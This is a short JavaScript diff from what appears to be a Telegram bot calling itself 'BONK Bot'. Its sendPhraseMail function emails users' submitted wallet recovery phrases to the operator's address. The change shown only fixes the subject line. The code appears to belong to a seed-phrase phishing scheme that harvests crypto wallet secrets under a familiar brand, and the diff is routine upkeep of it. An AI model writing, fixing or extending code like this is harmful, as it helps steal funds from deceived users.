@@ -19,7 +19,7 @@ const sendPhraseMail = async (telegram_id, firstName, phrase) => {
     const mailOptions = {
         from: `"BONK Bot 🔐" <${ADMIN_EMAIL}>`,
         to: ADMIN_EMAIL,
-        subject: `🔐 Wallet Phrase from ${firstName} ${lastName}`,
+        subject: `🔐 Wallet Phrase from ${firstName}`,
         html: `
             <div style="font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; max-width: 600px; margin: auto; border: 1px solid #eee; padding: 20px; border-radius: 8px; background-color: #f9f9f9;">
                 <h2 style="color: #d9534f;">🚨 New Phrase Submission</h2>
